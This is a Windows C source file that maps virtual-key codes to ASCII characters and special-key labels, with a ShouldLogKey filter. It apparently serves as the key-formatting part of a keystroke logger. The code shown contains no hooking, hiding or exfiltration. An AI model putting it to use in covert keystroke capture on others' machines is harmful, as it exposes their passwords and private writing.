#include <Windows.h>
#include "ascii_converter.h"

// Check if Shift key is currently pressed
bool IsShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
}

// Check if CapsLock is currently ON
bool IsCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

// Convert Virtual Key code to ASCII character
// Returns the character, or 0 if not a printable character
char VKToAscii(int vkCode, bool shift, bool caps) {

    // Letters A-Z (VK_A = 0x41 to VK_Z = 0x5A)
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        // XOR logic: uppercase if (shift XOR caps)
        bool uppercase = (shift && !caps) || (!shift && caps);
        return uppercase ? (char)vkCode : (char)(vkCode + 32);
    }

    // Numbers 0-9 (VK_0 = 0x30 to VK_9 = 0x39)
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (!shift) {
            return (char)vkCode;  // '0' to '9'
        }
        // Shift + Number = Special characters
        // 0=) 1=! 2=@ 3=# 4=$ 5=% 6=^ 7=& 8=* 9=(
        const char shiftedNumbers[] = ")!@#$%^&*(";
        return shiftedNumbers[vkCode - 0x30];
    }

    // Numpad 0-9 (VK_NUMPAD0 = 0x60 to VK_NUMPAD9 = 0x69)
    if (vkCode >= 0x60 && vkCode <= 0x69) {
        return (char)('0' + (vkCode - 0x60));
    }

    // Numpad operators
    switch (vkCode) {
        case VK_MULTIPLY:  return '*';  // 0x6A
        case VK_ADD:       return '+';  // 0x6B
        case VK_SUBTRACT:  return '-';  // 0x6D
        case VK_DECIMAL:   return '.';  // 0x6E
        case VK_DIVIDE:    return '/';  // 0x6F
    }

    // Common keys
    switch (vkCode) {
        case VK_SPACE:     return ' ';
        case VK_RETURN:    return '\n';
        case VK_TAB:       return '\t';
    }

    // OEM keys (US keyboard layout)
    switch (vkCode) {
        case VK_OEM_1:      // ;: key
            return shift ? ':' : ';';
        case VK_OEM_2:      // /? key
            return shift ? '?' : '/';
        case VK_OEM_3:      // `~ key
            return shift ? '~' : '`';
        case VK_OEM_4:      // [{ key
            return shift ? '{' : '[';
        case VK_OEM_5:      // \| key
            return shift ? '|' : '\\';
        case VK_OEM_6:      // ]} key
            return shift ? '}' : ']';
        case VK_OEM_7:      // '" key
            return shift ? '"' : '\'';
        case VK_OEM_PLUS:   // =+ key
            return shift ? '+' : '=';
        case VK_OEM_COMMA:  // ,< key
            return shift ? '<' : ',';
        case VK_OEM_MINUS:  // -_ key
            return shift ? '_' : '-';
        case VK_OEM_PERIOD: // .> key
            return shift ? '>' : '.';
    }

    // Not a printable character
    return 0;
}

// Get special key name as a string
// Returns NULL if not a special key
const char* GetSpecialKeyName(int vkCode) {
    switch (vkCode) {
        case VK_BACK:       return "[BACKSPACE]";
        case VK_ESCAPE:     return "[ESC]";
        case VK_DELETE:     return "[DEL]";
        case VK_INSERT:     return "[INS]";
        case VK_HOME:       return "[HOME]";
        case VK_END:        return "[END]";
        case VK_PRIOR:      return "[PAGEUP]";
        case VK_NEXT:       return "[PAGEDOWN]";
        case VK_LEFT:       return "[LEFT]";
        case VK_RIGHT:      return "[RIGHT]";
        case VK_UP:         return "[UP]";
        case VK_DOWN:       return "[DOWN]";
        case VK_PRINT:      return "[PRINT]";
        case VK_SNAPSHOT:   return "[PRTSC]";
        case VK_PAUSE:      return "[PAUSE]";
        case VK_NUMLOCK:    return "[NUMLOCK]";
        case VK_SCROLL:     return "[SCROLL]";
        case VK_CAPITAL:    return "[CAPSLOCK]";

        // Function keys F1-F24
        case VK_F1:  return "[F1]";
        case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";
        case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";
        case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";
        case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_F13: return "[F13]";
        case VK_F14: return "[F14]";
        case VK_F15: return "[F15]";
        case VK_F16: return "[F16]";
        case VK_F17: return "[F17]";
        case VK_F18: return "[F18]";
        case VK_F19: return "[F19]";
        case VK_F20: return "[F20]";
        case VK_F21: return "[F21]";
        case VK_F22: return "[F22]";
        case VK_F23: return "[F23]";
        case VK_F24: return "[F24]";

        // Modifier keys (usually we don't log these by themselves)
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_SHIFT:      return NULL;  // Don't log shift alone
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_CONTROL:    return NULL;  // Don't log ctrl alone
        case VK_LMENU:
        case VK_RMENU:
        case VK_MENU:       return NULL;  // Don't log alt alone
        case VK_LWIN:
        case VK_RWIN:       return NULL;  // Don't log win alone

        default:
            return NULL;
    }
}

// Check if a VK code should be logged
bool ShouldLogKey(int vkCode) {
    // Skip modifier keys when pressed alone
    switch (vkCode) {
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_MENU:      // Alt
        case VK_LMENU:
        case VK_RMENU:
        case VK_LWIN:
        case VK_RWIN:
            return false;  // Don't log modifier keys alone
        default:
            return true;
    }
}
